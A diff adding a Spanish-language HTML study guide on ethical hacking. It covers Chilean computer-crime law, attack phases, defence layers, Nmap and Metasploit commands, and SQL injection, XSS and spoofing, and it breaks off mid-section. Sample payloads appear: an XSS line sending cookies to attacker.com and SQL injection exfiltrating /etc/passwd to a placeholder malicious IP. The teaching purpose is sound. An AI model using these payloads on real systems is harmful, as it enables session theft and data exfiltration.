@@ -1,0 +1,937 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Guía de Hacking Ético</title>
+    <link rel="stylesheet" href="stiles.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/js/all.min.js"></script>
+</head>
+
+<body>
+    <div class="hacker-bg"></div>
+    <div class="hacker-scanline"></div>
+    <header>
+        <h1 class="typing"><i class="fas fa-user-secret"></i> Guía de Hacking Ético</h1>
+    </header>
+    <nav>
+        <ul>
+            <li><a href="#introduccion">Introducción</a></li>
+            <li><a href="#ley21459">Ley 21.459</a></li>
+            <li><a href="#footprinting">Footprinting</a></li>
+            <li><a href="#amenazas">Amenazas</a></li>
+            <li><a href="#vectores">Vectores de Ataque</a></li>
+            <li><a href="#fases">Fases de un Ataque</a></li>
+            <li><a href="#defensa">Defensa en Profundidad</a></li>
+            <li><a href="#herramientas">Herramientas</a></li>
+            <li><a href="#ataques">Tipos de Ataques</a></li>
+            <li><a href="#arquitectura">Arquitectura de Seguridad</a></li>
+            <li><a href="#kali-linux">Kali Linux</a></li>
+            <li><a href="#incident-response">Respuesta a Incidentes</a></li>
+            <li><a href="#ntfs-streams">NTFS Streams</a></li>
+            <li><a href="#security-policy">Política de Seguridad</a></li>
+            <li><a href="#web-attacks">Ataques Web</a></li>
+            <li><a href="#network-attacks">Ataques de Red</a></li>
+            <li><a href="#network-security">Seguridad de Red</a></li>
+            <li><a href="#network-models">Modelos de Red</a></li>
+            <li><a href="#network-attacks-advanced">Ataques de Red Avanzados</a></li>
+            <li><a href="#wireless-security">Seguridad en Redes Inalámbricas</a></li>
+            <li><a href="#log-analysis">Análisis de Logs</a></li>
+        </ul>
+    </nav>
+    <main class="container">
+        <section id="introduccion">
+            <h2><i class="fas fa-info-circle"></i> Introducción al Hacking Ético</h2>
+            <p>El hacking ético es la práctica autorizada de probar la seguridad de sistemas informáticos para
+                identificar vulnerabilidades antes de que sean explotadas por atacantes maliciosos.</p>
+            <div class="expandable">
+                <h3>Objetivos principales <span class="blink">_</span></h3>
+                <div class="expandable-content">
+                    <ul>
+                        <li>Identificar vulnerabilidades en sistemas y redes</li>
+                        <li>Evaluar la efectividad de las medidas de seguridad existentes</li>
+                        <li>Proporcionar recomendaciones para mejorar la seguridad</li>
+                        <li>Ayudar a las organizaciones a cumplir con regulaciones y estándares de seguridad</li>
+                    </ul>
+                </div>
+            </div>
+        </section>
+
+        <section id="ley21459">
+            <h2><i class="fas fa-gavel"></i> Ley 21.459 - Delitos Informáticos</h2>
+            <div class="expandable">
+                <h3>Artículo 1: Ataque a la integridad de un sistema informático <span class="blink">_</span></h3>
+                <div class="expandable-content">
+                    <p>Definición: Obstaculizar o modificar el funcionamiento de un sistema informático.</p>
+                    <p>Pena: Presidio menor en su grado medio a máximo.</p>
+                </div>
+            </div>
+            <div class="expandable">
+                <h3>Artículo 2: Acceso ilícito <span class="blink">_</span></h3>
+                <div class="expandable-content">
+                    <p>Definición: Acceder a un sistema informático sin autorización.</p>
+                    <p>Pena: Presidio menor en su grado mínimo a medio.</p>
+                </div>
+            </div>
+            <div class="expandable">
+                <h3>Artículo 3: Interceptación ilícita <span class="blink">_</span></h3>
+                <div class="expandable-content">
+                    <p>Definición: Interceptar, interrumpir o interferir indebidamente señales no públicas.</p>
+                    <p>Pena: Presidio menor en su grado medio a máximo.</p>
+                </div>
+            </div>
+            <div class="expandable">
+                <h3>Artículo 4: Ataque a la integridad de los datos informáticos <span class="blink">_</span></h3>
+                <div class="expandable-content">
+                    <p>Definición: Dañar, borrar, deteriorar, alterar o suprimir datos informáticos.</p>
+                    <p>Pena: Presidio menor en su grado medio a máximo.</p>
+                </div>
+            </div>
+            <div class="expandable">
+                <h3>Artículo 5: Falsificación informática <span class="blink">_</span></h3>
+                <div class="expandable-content">
+                    <p>Definición: Introducir, alterar, borrar o suprimir datos informáticos con la intención de que sean considerados o utilizados a efectos legales como auténticos.</p>
+                    <p>Pena: Presidio menor en su grado medio a máximo y multa de once a quince unidades tributarias mensuales.</p>
+                </div>
+            </div>
+            <div class="expandable">
+                <h3>Artículo 6: Receptación de datos informáticos <span class="blink">_</span></h3>
+                <div class="expandable-content">
+                    <p>Definición: Comercializar, transferir o almacenar datos informáticos, provenientes de la realización de las conductas descritas en los artículos 2, 3 y 5.</p>
+                    <p>Pena: Presidio menor en su grado medio y multa de once a quince unidades tributarias mensuales.</p>
+                </div>
+            </div>
+            <div class="expandable">
+                <h3>Artículo 7: Fraude informático <span class="blink">_</span></h3>
+                <div class="expandable-content">
+                    <p>Definición: Causar perjuicio a otro manipulando un sistema informático, o los datos contenidos en él.</p>
+                    <p>Pena: Presidio menor en sus grados medio a máximo y multa de once a quince unidades tributarias mensuales.</p>
+                </div>
+            </div>
+            <div class="expandable">
+                <h3>Artículo 8: Abuso de los dispositivos <span class="blink">_</span></h3>
+                <div class="expandable-content">
+                    <p>Definición: Entregar u obtener para su utilización, importar, difundir o realizar otras formas de poner a disposición uno o más dispositivos, programas computacionales, contraseñas, códigos de seguridad o de acceso u otros datos similares, creados o adaptados principalmente para la perpetración de los delitos previstos en los artículos 1 a 4 de esta ley.</p>
+                    <p>Pena: Presidio menor en su grado mínimo a medio y multa de cinco a diez unidades tributarias mensuales.</p>
+                </div>
+            </div>
+        </section>
+
+        <section id="footprinting">
+            <h2><i class="fas fa-search"></i> Footprinting</h2>
+            <div class="expandable">
+                <h3>Footprinting Pasivo</h3>
+                <div class="expandable-content">
+                    <p>Recolección de información sin interactuar directamente con el objetivo.</p>
+                    <h4>Herramientas:</h4>
+                    <ul>
+                        <li>WHOIS</li>
+                        <li>Google Dorks</li>
+                        <li>Shodan</li>
+                        <li>theHarvester</li>
+                    </ul>
+                </div>
+            </div>
+            <div class="expandable">
+                <h3>Footprinting Activo</h3>
+                <div class="expandable-content">
+                    <p>Interacción directa con el objetivo para obtener información.</p>
+                    <h4>Herramientas:</h4>
+                    <ul>
+                        <li>Nmap</li>
+                        <li>Ping</li>
+                        <li>Traceroute</li>
+                        <li>NSLookup</li>
+                    </ul>
+                </div>
+            </div>
+        </section>
+
+        <section id="amenazas">
+            <h2><i class="fas fa-exclamation-triangle"></i> Amenazas de Seguridad</h2>
+            <!-- Existing content remains -->
+            <div class="expandable">
+                <h3>Amenazas Naturales</h3>
+                <div class="expandable-content">
+                    <ul>
+                        <li>Inundaciones</li>
+                        <li>Terremotos</li>
+                        <li>Incendios</li>
+                        <li>Tormentas eléctricas</li>
+                    </ul>
+                </div>
+            </div>
+            <div class="expandable">
+                <h3>Amenazas de Seguridad Física</h3>
+                <div class="expandable-content">
+                    <ul>
+                        <li>Acceso no autorizado a instalaciones</li>
+                        <li>Robo de equipos</li>
+                        <li>Vandalismo</li>
+                        <li>Sabotaje</li>
+                    </ul>
+                </div>
+            </div>
+            <div class="expandable">
+                <h3>Amenazas Humanas</h3>
+                <div class="expandable-content">
+                    <ul>
+                        <li>Error humano</li>
+                        <li>Ingeniería social</li>
+                        <li>Empleados descontentos</li>
+                        <li>Espionaje industrial</li>
+                    </ul>
+                </div>
+            </div>
+            <div class="expandable">
+                <h3>Amenazas de Aplicación</h3>
+                <div class="expandable-content">
+                    <p>Las amenazas de aplicación se centran en explotar vulnerabilidades en el software y las aplicaciones utilizadas por una organización.</p>
+                    <h4>Tipos de amenazas de aplicación:</h4>
+                    <ul>
+                        <li><strong>Inyección de código:</strong> Inserción de código malicioso en una aplicación para alterar su funcionamiento.</li>
+                        <li><strong>Cross-Site Scripting (XSS):</strong> Inyección de scripts maliciosos en páginas web vistas por otros usuarios.</li>
+                        <li><strong>Vulnerabilidades de deserialización:</strong> Explotación de procesos de deserialización inseguros para ejecutar código arbitrario.</li>
+                        <li><strong>Exposición de datos sensibles:</strong> Acceso no autorizado a información confidencial debido a protecciones inadecuadas.</li>
+                        <li><strong>Configuración incorrecta de seguridad:</strong> Explotación de configuraciones por defecto o inseguras en aplicaciones.</li>
+                    </ul>
+                    <h4>Impacto de las amenazas de aplicación:</h4>
+                    <ul>
+                        <li>Robo de datos sensibles</li>
+                        <li>Manipulación de la funcionalidad de la aplicación</li>
+                        <li>Compromiso de cuentas de usuario</li>
+                        <li>Daño a la reputación de la organización</li>
+                        <li>Pérdidas financieras debido a interrupciones del servicio o fraudes</li>
+                    </ul>
+                </div>
+            </div>
+        </section>
+
+        <section id="vectores">
+            <h2><i class="fas fa-vector-square"></i> Vectores de Ataque</h2>
+            <!-- Existing content remains -->
+            <div class="expandable">
+                <h3>Vector de Host</h3>
+                <div class="expandable-content">
+                    <ul>
+                        <li>Malware (virus, gusanos, troyanos, ransomware)</li>
+                        <li>Keyloggers</li>
+                        <li>Ingeniería social (phishing, spear phishing, vishing, smishing)</li>
+                    </ul>
+                </div>
+            </div>
+            <div class="expandable">
+                <h3>Vector de Red</h3>
+                <div class="expandable-content">
+                    <h4>Ataques Activos</h4>
+                    <ul>
+                        <li>Spoofing (IP, ARP, DNS)</li>
+                        <li>DDoS (Denegación de Servicio Distribuida)</li>
+                        <li>Fabricación</li>
+                        <li>Modificación</li>
+                    </ul>
+                    <h4>Ataques Pasivos</h4>
+                    <ul>
+                        <li>Sniffing</li>
+                        <li>Escucha</li>
+                        <li>Supervisión</li>
+                    </ul>
+                </div>
+            </div>
+
+            <div class="expandable">
+                <h3>Vector de Red funciones </h3>
+                <div class="expandable-content">
+                    <p>Un vector de red se refiere a las vías o métodos que un atacante puede utilizar para acceder o comprometer una red.</p>
+                    <h4>Funcionamiento:</h4>
+                    <ul>
+                        <li>Explota vulnerabilidades en protocolos de red, configuraciones incorrectas o debilidades en la seguridad perimetral.</li>
+                        <li>Puede ser utilizado para obtener acceso inicial, moverse lateralmente dentro de la red o exfiltrar datos.</li>
+                    </ul>
+                    <h4>Vector de Red Activo:</h4>
+                    <ul>
+                        <li>Implica interacción directa con los sistemas objetivo.</li>
+                        <li>Ejemplos: Escaneo de puertos, ataques de fuerza bruta, explotación de vulnerabilidades conocidas.</li>
+                        <li>Más fácil de detectar debido a la actividad generada en la red.</li>
+                    </ul>
+                    <h4>Vector de Red Pasivo:</h4>
+                    <ul>
+                        <li>No implica interacción directa con los sistemas objetivo.</li>
+                        <li>Ejemplos: Sniffing de red, análisis de tráfico, interceptación pasiva de datos.</li>
+                        <li>Más difícil de detectar ya que no genera tráfico adicional en la red.</li>
+                    </ul>
+                </div>
+            </div>
+        </section>
+
+
+        <section id="fases">
+            <h2><i class="fas fa-chart-line"></i> Fases de un Ataque</h2>
+            <ol>
+                <li>
+                    <div class="expandable">
+                        <h3>Reconocimiento</h3>
+                        <div class="expandable-content">
+                            <ul>
+                                <li>Recopilación de información pública (OSINT)</li>
+                                <li>Herramientas: theHarvester, Maltego, Recon-ng</li>
+                                <li>Técnicas: Dumpster diving, ingeniería social</li>
+                            </ul>
+                        </div>
+                    </div>
+                </li>
+                <li>
+                    <div class="expandable">
+                        <h3>Escaneo</h3>
+                        <div class="expandable-content">
+                            <ul>
+                                <li>Descubrimiento de hosts activos</li>
+                                <li>Identificación de puertos abiertos y servicios</li>
+                                <li>Herramientas: Nmap, Angry IP Scanner, Masscan</li>
+                            </ul>
+                        </div>
+                    </div>
+                </li>
+                <li>
+                    <div class="expandable">
+                        <h3>Obtención de Acceso</h3>
+                        <div class="expandable-content">
+                            <ul>
+                                <li>Explotación de vulnerabilidades</li>
+                                <li>Uso de exploits y payloads</li>
+                                <li>Herramientas: Metasploit, ExploitDB, SQLmap</li>
+                            </ul>
+                        </div>
+                    </div>
+                </li>
+                <li>
+                    <div class="expandable">
+                        <h3>Mantener Acceso</h3>
+                        <div class="expandable-content">
+                            <ul>
+                                <li>Instalación de backdoors y rootkits</li>
+                                <li>Creación de cuentas de usuario ocultas</li>
+                                <li>Herramientas: Netcat, Meterpreter, Empire</li>
+                            </ul>
+                        </div>
+                    </div>
+                </li>
+                <li>
+                    <div class="expandable">
+                        <h3>Borrado de Huellas</h3>
+                        <div class="expandable-content">
+                            <ul>
+                                <li>Eliminación de logs y evidencias</li>
+                                <li>Ocultamiento de archivos y procesos</li>
+                                <li>Técnicas: Timestomping, log cleaning</li>
+                            </ul>
+                        </div>
+                    </div>
+                </li>
+            </ol>
+        </section>
+
+        <section id="defensa">
+            <h2><i class="fas fa-shield-alt"></i> Defensa en Profundidad</h2>
+            <!-- Existing content remains -->
+            <div class="expandable">
+                <h3>Política de Seguridad</h3>
+                <div class="expandable-content">
+                    <ul>
+                        <li>Definición de roles y responsabilidades</li>
+                        <li>Procedimientos de seguridad documentados</li>
+                        <li>Gestión de incidentes y planes de respuesta</li>
+                        <li>Planes de continuidad de negocio y recuperación ante desastres</li>
+                    </ul>
+                </div>
+            </div>
+            <div class="expandable">
+                <h3>Capas de Defensa</h3>
+                <div class="expandable-content">
+                    <ol>
+                        <li>Datos: Encriptación, control de acceso, backups</li>
+                        <li>Aplicación: Actualizaciones, configuración segura, validación de entrada</li>
+                        <li>Host: Antivirus, firewall personal, hardening</li>
+                        <li>Red Interna: Segmentación, IDS/IPS, NAC</li>
+                        <li>Perímetro: Firewalls, DMZ, VPN</li>
+                    </ol>
+                </div>
+            </div>
+            <div class="expandable">
+                <h3>Capas de Defensa Detalladas</h3>
+                <div class="expandable-content">
+                    <ol>
+                        <li><strong>Datos:</strong>
+                            <ul>
+                                <li>Encriptación de datos en reposo y en tránsito</li>
+                                <li>Control de acceso basado en roles (RBAC)</li>
+                                <li>Clasificación y etiquetado de datos</li>
+                                <li>Copias de seguridad regulares y almacenamiento seguro</li>
+                            </ul>
+                        </li>
+                        <li><strong>Aplicación:</strong>
+                            <ul>
+                                <li>Actualizaciones y parches de seguridad regulares</li>
+                                <li>Implementación de autenticación multifactor (MFA)</li>
+                                <li>Validación y sanitización de entradas de usuario</li>
+                                <li>Uso de HTTPS y certificados SSL/TLS</li>
+                            </ul>
+                        </li>
+                        <li><strong>Host:</strong>
+                            <ul>
+                                <li>Antivirus y antimalware actualizados</li>
+                                <li>Firewall personal configurado correctamente</li>
+                                <li>Hardening de sistemas operativos</li>
+                                <li>Monitoreo de integridad de archivos</li>
+                            </ul>
+                        </li>
+                        <li><strong>Red Interna:</strong>
+                            <ul>
+                                <li>Segmentación de red (VLANs)</li>
+                                <li>Sistemas de Detección y Prevención de Intrusiones (IDS/IPS)</li>
+                                <li>Control de Acceso a la Red (NAC)</li>
+                                <li>Monitoreo y análisis de tráfico de red</li>
+                            </ul>
+                        </li>
+                        <li><strong>Perímetro:</strong>
+                            <ul>
+                                <li>Firewalls de nueva generación (NGFW)</li>
+                                <li>Zona desmilitarizada (DMZ) para servicios públicos</li>
+                                <li>VPN para acceso remoto seguro</li>
+                                <li>Filtrado de contenido web y correo electrónico</li>
+                            </ul>
+                        </li>
+                    </ol>
+                    <h4>Amenazas y Protocolos de Defensa por Capa:</h4>
+                    <ul>
+                        <li><strong>Datos:</strong> 
+                            <ul>
+                                <li>Amenazas: Fuga de datos, acceso no autorizado</li>
+                                <li>Protocolos: Implementar DLP (Data Loss Prevention), auditorías regulares de acceso</li>
+                            </ul>
+                        </li>
+                        <li><strong>Aplicación:</strong>
+                            <ul>
+                                <li>Amenazas: Inyección SQL, XSS, CSRF</li>
+                                <li>Protocolos: Implementar WAF (Web Application Firewall), realizar pruebas de penetración regulares</li>
+                            </ul>
+                        </li>
+                        <li><strong>Host:</strong>
+                            <ul>
+                                <li>Amenazas: Malware, escalada de privilegios</li>
+                                <li>Protocolos: Implementar EDR (Endpoint Detection and Response), gestión de parches automatizada</li>
+                            </ul>
+                        </li>
+                        <li><strong>Red Interna:</strong>
+                            <ul>
+                                <li>Amenazas: Movimiento lateral, exfiltración de datos</li>
+                                <li>Protocolos: Implementar detección de anomalías basada en IA, segmentación de red Zero Trust</li>
+                            </ul>
+                        </li>
+                        <li><strong>Perímetro:</strong>
+                            <ul>
+                                <li>Amenazas: DDoS, escaneo de puertos</li>
+                                <li>Protocolos: Implementar servicios anti-DDoS, mantener una postura de seguridad adaptativa</li>
+                            </ul>
+                        </li>
+                    </ul>
+                </div>
+            </div>
+        </section>
+
+        <section id="herramientas">
+            <h2><i class="fas fa-tools"></i> Herramientas de Hacking Ético</h2>
+            <div class="expandable">
+                <h3>Nmap</h3>
+                <div class="expandable-content">
+                    <p>Herramienta de código abierto para descubrimiento de redes y auditoría de seguridad.</p>
+                    <h4>Comandos comunes:</h4>
+                    <pre><code>
+# Escaneo básico de red
+nmap 192.168.1.0/24
+
+# Escaneo de puertos específicos
+nmap -p 80,443,3306 192.168.1.1
+
+# Escaneo de todos los puertos
+nmap -p- 192.168.1.1
+
+# Detección de servicios y versiones
+nmap -sV 192.168.1.1
+
+# Escaneo sigiloso SYN
+nmap -sS 192.168.1.1
+
+# Escaneo con scripts NSE
+nmap --script vuln 192.168.1.1
+                    </code></pre>
+                </div>
+            </div>
+            <div class="expandable">
+                <h3>Metasploit</h3>
+                <div class="expandable-content">
+                    <p>Framework de pruebas de penetración que facilita el desarrollo, prueba y ejecución de exploits.
+                    </p>
+                    <h4>Comandos básicos:</h4>
+                    <pre><code>
+# Iniciar Metasploit
+msfconsole
+
+# Buscar un exploit
+search [nombre_del_exploit]
+
+# Usar un exploit
+use [ruta_del_exploit]
+
+# Mostrar opciones del exploit
+show options
+
+# Configurar una opción
+set [opción] [valor]
+
+# Ejecutar el exploit
+exploit
+                    </code></pre>
+                </div>
+            </div>
+        </section>
+
+        <section id="arquitectura">
+            <h2><i class="fas fa-sitemap"></i> Arquitectura de Seguridad</h2>
+            <div class="expandable">
+                <h3>Política de Seguridad</h3>
+                <div class="expandable-content">
+                    <p>Conjunto de reglas y procedimientos que definen cómo una organización gestiona, protege y
+                        distribuye sus activos de información.</p>
+                    <h4>Componentes clave:</h4>
+                    <ul>
+                        <li>Política de contraseñas</li>
+                        <li>Política de control de acceso</li>
+                        <li>Política de uso aceptable</li>
+                        <li>Política de respuesta a incidentes</li>
+                    </ul>
+                </div>
+            </div>
+            <div class="expandable">
+                <h3>Infraestructura de Seguridad</h3>
+                <div class="expandable-content">
+                    <h4>Componentes físicos:</h4>
+                    <ul>
+                        <li>Firewalls</li>
+                        <li>IDS/IPS</li>
+                        <li>Servidores de autenticación</li>
+                        <li>VPNs</li>
+                    </ul>
+                    <h4>Componentes lógicos:</h4>
+                    <ul>
+                        <li>Antivirus/Antimalware</li>
+                        <li>Sistemas de gestión de logs</li>
+                        <li>Herramientas de monitoreo de red</li>
+                    </ul>
+                </div>
+            </div>
+        </section>
+
+
+
+        <section id="kali-linux">
+            <h2><i class="fab fa-linux"></i> Kali Linux y Herramientas</h2>
+            <!-- Existing content remains -->
+            <div class="expandable">
+                <h3>Kali Linux <span class="blink">_</span></h3>
+                <div class="expandable-content">
+                    <p>Kali Linux es una distribución de Linux basada en Debian diseñada para pruebas de penetración y
+                        auditorías de seguridad.</p>
+                    <h4>Herramientas principales:</h4>
+                    <ul>
+                        <li>Nmap: Escáner de puertos y herramienta de descubrimiento de red</li>
+                        <li>Metasploit Framework: Plataforma para desarrollar y ejecutar exploits</li>
+                        <li>Wireshark: Analizador de protocolos de red</li>
+                        <li>Burp Suite: Herramienta para pruebas de seguridad en aplicaciones web</li>
+                        <li>Aircrack-ng: Suite para auditoría de redes inalámbricas</li>
+                    </ul>
+                </div>
+            </div>
+            <div class="expandable">
+                <h3>Comandos Avanzados de Nmap <span class="blink">_</span></h3>
+                <div class="expandable-content">
+                    <p>Nmap ofrece una variedad de opciones para escaneos de red avanzados:</p>
+                    <pre><code>
+# Escanear red por rango de IP
+nmap 192.168.1.1-254
+
+# Escanear puerto determinado
+nmap -p 80 192.168.1.1
+
+# Escanear n puertos en IP determinada
+nmap -p 1-1000 192.168.1.1
+
+# Escanear los x primeros puertos en la IP determinada
+nmap --top-ports 100 192.168.1.1
+
+# Escaneo sigiloso SYN con detección de OS y versiones
+nmap -sS -O -sV 192.168.1.1
+                    </code></pre>
+                    <p>Recuerda siempre obtener permiso antes de escanear redes que no te pertenezcan.</p>
+                </div>
+            </div>
+        </section>
+
+        <section id="incident-response">
+            <h2><i class="fas fa-fire-extinguisher"></i> Respuesta a Incidentes</h2>
+            <div class="expandable">
+                <h3>Fases de Respuesta a Incidentes <span class="blink">_</span></h3>
+                <div class="expandable-content">
+                    <ol>
+                        <li>Preparación</li>
+                        <li>Identificación</li>
+                        <li>Contención</li>
+                        <li>Erradicación</li>
+                        <li>Recuperación</li>
+                        <li>Lecciones aprendidas</li>
+                    </ol>
+                    <p>Herramientas: SIEM (Security Information and Event Management), EDR (Endpoint Detection and Response)</p>
+                    <p>Evitar: Destruir evidencias durante la respuesta a incidentes.</p>
+                </div>
+            </div>
+            <div class="expandable">
+                <h3>Arquitectura de Respuesta a Incidentes <span class="blink">_</span></h3>
+                <div class="expandable-content">
+                    <p>Una arquitectura de respuesta a incidentes efectiva incluye los siguientes componentes:</p>
+                    <ul>
+                        <li><strong>Centro de Operaciones de Seguridad (SOC):</strong> Monitoreo centralizado y respuesta inicial.</li>
+                        <li><strong>Equipo de Respuesta a Incidentes de Seguridad Informática (CSIRT):</strong> Equipo especializado para manejar incidentes complejos.</li>
+                        <li><strong>Sistemas de Detección y Prevención de Intrusiones (IDS/IPS):</strong> Para identificar y bloquear actividades maliciosas.</li>
+                        <li><strong>Plataforma de Gestión de Incidentes:</strong> Para coordinar y documentar la respuesta.</li>
+                        <li><strong>Herramientas Forenses:</strong> Para recopilar y analizar evidencias.</li>
+                    </ul>
+                </div>
+            </div>
+            <div class="expandable">
+                <h3>Protocolos de Respuesta a Incidentes <span class="blink">_</span></h3>
+                <div class="expandable-content">
+                    <p>Los protocolos de respuesta a incidentes son procedimientos predefinidos que guían las acciones durante un incidente de seguridad:</p>
+                    <ol>
+                        <li><strong>Notificación:</strong> Establecer canales claros para reportar incidentes.</li>
+                        <li><strong>Evaluación inicial:</strong> Determinar la gravedad y el alcance del incidente.</li>
+                        <li><strong>Contención inmediata:</strong> Implementar medidas para limitar el daño.</li>
+                        <li><strong>Investigación:</strong> Recopilar y analizar evidencias.</li>
+                        <li><strong>Remediación:</strong> Eliminar la amenaza y restaurar los sistemas afectados.</li>
+                        <li><strong>Comunicación:</strong> Mantener informadas a las partes interesadas.</li>
+                        <li><strong>Documentación:</strong> Registrar todas las acciones y hallazgos.</li>
+                        <li><strong>Revisión post-incidente:</strong> Analizar la respuesta y mejorar los procesos.</li>
+                    </ol>
+                </div>
+            </div>
+        </section>
+
+        <section id="ntfs-streams">
+            <h2><i class="fas fa-stream"></i> NTFS Streams</h2>
+            <div class="expandable">
+                <h3>Flujos Alternativos de Datos (ADS) <span class="blink">_</span></h3>
+                <div class="expandable-content">
+                    <p>Los NTFS streams permiten ocultar datos dentro de archivos existentes sin alterar su tamaño o
+                        funcionalidad aparente.</p>
+                    <h4>Comandos para trabajar con ADS:</h4>
+                    <pre><code>
+        # Crear un ADS
+        echo "Datos ocultos" > archivo.txt:stream
+        
+        # Ver contenido de un ADS
+        more < archivo.txt:stream
+        
+        # Eliminar un ADS
+        del archivo.txt:stream
+                    </code></pre>
+                    <p>Evitar: Usar ADS para ocultar malware o información sensible.</p>
+                </div>
+            </div>
+        </section>
+
+        <section id="web-attacks">
+            <h2><i class="fas fa-globe"></i> Ataques Web</h2>
+            <!-- Existing content remains -->
+            <div class="expandable">
+                <h3>Inyección SQL <span class="blink">_</span></h3>
+                <div class="expandable-content">
+                    <p>La inyección SQL es una técnica de ataque que inserta código SQL malicioso en las entradas de la aplicación para manipular la base de datos.</p>
+                    <h4>Tipos de Inyección SQL:</h4>
+                    <div class="sub-expandable">
+                        <h5>1. Inyección SQL en banda</h5>
+                        <div class="sub-expandable-content">
+                            <p>Es cuando el atacante es capaz de utilizar el mismo canal para insertar el código SQL malicioso en la aplicación y recibir los resultados. Se divide en dos subtipos:</p>
+                            <ul>
+                                <li><strong>Ataque basado en errores:</strong> Explota los mensajes de error para obtener información sobre la estructura de la base de datos.</li>
+                                <li><strong>Ataque basado en la Unión:</strong> Utiliza el operador UNION para combinar los resultados de múltiples consultas.</li>
+                            </ul>
+                            <h6>Ejemplo de ataque en banda:</h6>
+                            <pre><code>SELECT * FROM usuarios WHERE id = 1 UNION SELECT username, password FROM admin --</code></pre>
+                        </div>
+                    </div>
+                    <div class="sub-expandable">
+                        <h5>2. Inyección SQL Inferencial (Blind SQL Injection)</h5>
+                        <div class="sub-expandable-content">
+                            <p>El atacante envía varias consultas a la base de datos para evaluar cómo la aplicación analiza estas respuestas, sin recibir directamente los resultados. Se divide en dos subtipos:</p>
+                            <ul>
+                                <li><strong>Ataque Booleano:</strong> Evalúa qué partes de la entrada son vulnerables probando cláusulas booleanas.</li>
+                                <li><strong>Ataque basado en el tiempo:</strong> Utiliza funciones predefinidas basadas en el tiempo del sistema de administración de la base de datos.</li>
+                            </ul>
+                            <h6>Ejemplos de ataques inferenciales:</h6>
+                            <pre><code>
+        # Ataque Booleano
+        SELECT * FROM usuarios WHERE id = 1 AND 1=1 --
+        SELECT * FROM usuarios WHERE id = 1 AND 1=2 --
+        
+        # Ataque basado en el tiempo
+        SELECT * FROM comentarios WHERE post_id=1-SLEEP(15);
+                            </code></pre>
+                        </div>
+                    </div>
+                    <div class="sub-expandable">
+                        <h5>3. Inyección SQL fuera de banda</h5>
+                        <div class="sub-expandable-content">
+                            <p>Se utiliza cuando no se pueden obtener los resultados de una inyección SQL a través del mismo canal. Aprovecha las capacidades de procesamiento de archivos externos del SGBD.</p>
+                            <h6>Ejemplo de ataque fuera de banda:</h6>
+                            <pre><code>
+        SELECT * FROM post_table INTO OUTFILE '\\\\MALICIOUS_IP_ADDRESS\location'
+        
+        # Combinación de LOAD_FILE() y OUTFILE
+        SELECT LOAD_FILE('/etc/passwd') INTO OUTFILE '\\\\MALICIOUS_IP_ADDRESS\stolen_data'
+                            </code></pre>
+                            <p>Nota: Las funciones LOAD_FILE() y INTO OUTFILE en MySQL pueden ser utilizadas para transmitir datos a una fuente externa.</p>
+                        </div>
+                    </div>
+                    <h4>Prevención de Inyecciones SQL:</h4>
+                    <ul>
+                        <li>Usar consultas parametrizadas o prepared statements</li>
+                        <li>Implementar validación y sanitización estricta de entradas de usuario</li>
+                        <li>Aplicar el principio de mínimo privilegio en la base de datos</li>
+                        <li>Utilizar ORM (Object-Relational Mapping) cuando sea posible</li>
+                        <li>Mantener actualizado el software de la base de datos y aplicar parches de seguridad regularmente</li>
+                    </ul>
+                </div>
+            </div>
+            <div class="expandable">
+                <h3>Cross-Site Scripting (XSS) <span class="blink">_</span></h3>
+                <div class="expandable-content">
+                    <p>XSS permite a los atacantes inyectar scripts maliciosos en páginas web vistas por otros usuarios.
+                    </p>
+                    <h4>Ejemplo de ataque:</h4>
+                    <pre><code>&lt;script&gt;document.location='http://attacker.com/steal.php?cookie='+document.cookie&lt;/script&gt;</code></pre>
+                    <p>Herramientas: BeEF (Browser Exploitation Framework)</p>
+                    <p>Prevención: Escapar caracteres especiales, implementar Content Security Policy (CSP).</p>
+                </div>
+            </div>
+
+            <div class="expandable">
+                <h3>Desbordamiento de Buffer (Buffer Overflow) <span class="blink">_</span></h3>
+                <div class="expandable-content">
+                    <p>El desbordamiento de buffer es una vulnerabilidad que ocurre cuando un programa escribe datos más allá de los límites asignados en memoria.</p>
+                    <h4>Características:</h4>
+                    <ul>
+                        <li>Puede permitir la ejecución de código arbitrario.</li>
+                        <li>Comúnmente explotado en lenguajes como C y C++ que no realizan comprobación de límites automática.</li>
+                        <li>Puede llevar a la corrupción de datos, caídas del sistema o escalada de privilegios.</li>
+                    </ul>
+                    <h4>Prevención:</h4>
+                    <ul>
+                        <li>Usar lenguajes con gestión automática de memoria (como Java o Python).</li>
+                        <li>Implementar comprobación de límites en operaciones de memoria.</li>
+                        <li>Utilizar funciones seguras (por ejemplo, strncpy en lugar de strcpy en C).</li>
+                        <li>Habilitar protecciones del sistema operativo como ASLR (Address Space Layout Randomization) y DEP (Data Execution Prevention).</li>
+                    </ul>
+                </div>
+            </div>
+        </section>
+
+        <section id="network-attacks">
+            <h2><i class="fas fa-network-wired"></i> Ataques de Red</h2>
+            <div class="expandable">
+                <h3>Fingerprinting <span class="blink">_</span></h3>
+                <div class="expandable-content">
+                    <p>El fingerprinting es el proceso de recopilar información sobre sistemas y redes objetivo.</p>
+                    <h4>Herramientas:</h4>
+                    <ul>
+                        <li>Nmap para escaneo de puertos y detección de SO</li>
+                        <li>p0f para fingerprinting pasivo</li>
+                    </ul>
+                    <p>Evitar: Realizar fingerprinting en redes sin autorización.</p>
+                </div>
+            </div>
+            <div class="expandable">
+                <h3>Spoofing <span class="blink">_</span></h3>
+                <div class="expandable-content">
+                    <p>El spoofing implica falsificar la identidad o el origen de los datos en una comunicación.</p>
+                    <h4>Tipos comunes:</h4>
+                    <ul>
+                        <li>IP Spoofing</li>
+                        <li>ARP Spoofing</li>
+                        <li>DNS Spoofing</li>
+                    </ul>
+                    <p>Herramientas: Ettercap, Scapy</p>
+                    <p>Prevención: Implementar autenticación fuerte, usar HTTPS, configurar correctamente firewalls.</p>
+                </div>
+            </div>
+        </section>
+
+        <section id="network-security">
+            <h2><i class="fas fa-shield-alt"></i> Seguridad de Red</h2>
+            <div class="expandable">
+                <h3>Proxy <span class="blink">_</span></h3>
+                <div class="expandable-content">
+                    <p>Un proxy actúa como intermediario entre los clientes y los servidores, pudiendo filtrar, cachear
+                        o modificar el tráfico.</p>
+                    <h4>Tipos de proxies:</h4>
+                    <ul>
+                        <li>Forward Proxy</li>
+                        <li>Reverse Proxy</li>
+                        <li>Transparent Proxy</li>
+                    </ul>
